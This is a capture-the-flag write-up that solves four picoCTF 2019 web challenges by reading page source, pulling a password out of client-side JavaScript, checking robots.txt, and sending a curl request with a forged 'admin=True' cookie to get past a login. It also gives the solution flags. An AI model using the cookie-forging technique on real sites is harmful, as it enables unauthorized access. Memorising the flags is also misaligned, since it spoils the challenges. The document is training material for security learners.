# WebExploitation

## Insp3ct0r (50 points)

Kishor Balan tipped us off that the following code may need inspection: `https://2019shell1.picoctf.com/problem/52962/` (link) or `http://2019shell1.picoctf.com:52962`

FLAG: `picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?39dd9e36}`

It is hinted that the website is created using HTML, CSS, and JavaScript. View the source of the page, we will see at the end of the page:

```html
<!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 -->
```

Do the same for the CSS and JavaScript.

At the end of `mycss.css`, we see:

```css
/* You need CSS to make pretty pages. Here's part 2/3 of the flag: t3ct1ve_0r_ju5t */
```

At the end of `myjs.js`, we see:

```javascript
/* Javascript sure is neat. Anyways part 3/3 of the flag: _lucky?39dd9e36} */
```

Combining the three messages, we have the flag: `picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?39dd9e36}`.

## dont-use-client-side (100 points)

Can you break into this super secure portal? `https://2019shell1.picoctf.com/problem/12280/` (link) or `http://2019shell1.picoctf.com:12280`

FLAG: `picoCTF{no_clients_plz_577431}`

This webpage asks for a credential and checks it.

Check the JavaScript attached to this webpage, we see the following function:

```javascript
function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
        if (checkpass.substring(split*6, split*7) == '7743') {
            if (checkpass.substring(split, split*2) == 'CTF{') {
                if (checkpass.substring(split*4, split*5) == 'ts_p') {
                    if (checkpass.substring(split*3, split*4) == 'lien') {
                        if (checkpass.substring(split*5, split*6) == 'lz_5') {
                            if (checkpass.substring(split*2, split*3) == 'no_c') {
                                if (checkpass.substring(split*7, split*8) == '1}') {
                                    alert("Password Verified")
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    else {
        alert("Incorrect password");
    }
}
```

Combine those pieces of string and reorganize to get the original password: `picoCTF{no_clients_plz_577431}`.

## logon (100 points)

The factory is hiding things from all of its users. Can you login as logon and find what they've been looking at? `https://2019shell1.picoctf.com/problem/47307/` (link) or `http://2019shell1.picoctf.com:47307`

FLAG: `picoCTF{th3_c0nsp1r4cy_l1v3s_95e4b2d5}`

Let's first look at the actual request that gets sent to the login page.

Try to set the username to be 'aaa' and password to be 'bbb'. Notice that the cookies look like follows:

```txt
password=bbb; username=aaa; admin=False
```

It's weird because we didn't actually set the option for admin. Hence, let's set admin to be 'True' and resend the request.

Note that the request is sent to `/login` and then to `/flag`. The url for the `/flag` page should be `http://2019shell1.picoctf.com:47307/flag`.

Type the following command in Bash:

```bash
$ curl http://2019shell1.picoctf.com:47307/flag -v --cookie 'admin=True;username=;password=;'
```

We will get the following response:

```txt
*   Trying 3.15.247.173...
* TCP_NODELAY set
* Connected to 2019shell1.picoctf.com (3.15.247.173) port 47307 (#0)
> GET /flag HTTP/1.1
> Host: 2019shell1.picoctf.com:47307
> User-Agent: curl/7.64.1
> Accept: */*
> Cookie: admin=True;username=;password=;
> 
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 1312
< Set-Cookie: password=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Path=/
< Set-Cookie: username=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Path=/
< Set-Cookie: admin=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Path=/
< 
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Factory Login</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation" class="active"><a href="/">Home</a>
                    </li>
                    <li role="presentation"><a href="/logout" class="btn btn-link pull-right">Sign Out</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Factory Login</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_95e4b2d5}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF 2019</p>
        </footer>

    </div>
</body>

* Connection #0 to host 2019shell1.picoctf.com left intact
</html>* Closing connection 0
```

Hence, the flag is `picoCTF{th3_c0nsp1r4cy_l1v3s_95e4b2d5}`.

## where are the robots (100 points)

Can you find the robots? `https://2019shell1.picoctf.com/problem/21868/` (link) or `http://2019shell1.picoctf.com:21868`

FLAG: `picoCTF{ca1cu1at1ng_Mach1n3s_e0779}`

First, we look up the whole website. After checking the html, css, js, cache, network requests, we notice nothing special.

On the page, it says:

> Where are the robots

This is actually a hint. Google uses web scrawlers to find web pages and website owners can specify which path they don't want google to fetch in a file called `robots.txt` and place it under the root dir of the website.

Let's go to `https://2019shell1.picoctf.com/problem/21868/robots.txt`. We will see the following message:

```txt
User-agent: *
Disallow: /e0779.html
```

Let's go to `https://2019shell1.picoctf.com/problem/21868/e0779.html`. The flag is shown as `picoCTF{ca1cu1at1ng_Mach1n3s_e0779}`.